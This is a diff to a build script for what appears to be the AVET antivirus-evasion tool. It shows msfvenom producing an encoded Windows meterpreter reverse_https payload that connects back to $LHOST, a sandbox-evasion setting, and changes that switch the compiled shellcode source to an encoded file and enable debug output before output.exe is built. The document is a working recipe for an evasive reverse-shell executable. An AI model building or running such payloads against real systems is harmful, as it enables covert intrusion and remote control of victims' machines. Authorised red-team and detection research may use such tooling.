@@ -27,8 +27,11 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 # add fopen sandbox evasion
 add_evasion fopen_sandbox_evasion
 
+# convert encoded shellcode file to c array style for static include
+./tools/data_raw_to_c/data_raw_to_c input/scclean.txt input/scenc.txt buf
+
 # set shellcode source
-set_shellcode_source static_from_file input/scclean.txt
+set_shellcode_source static_from_file input/scenc.txt
 
 # set decoder and key source
 # AVET decoder needs no key
@@ -37,6 +40,9 @@ set_key_source none
 
 # set shellcode binding technique
 set_shellcode_binding exec_shellcode
+
+# enable debug output
+enable_debug_print
 
 # compile to output.exe file
 $win32_compiler -o output/output.exe source/avet.c
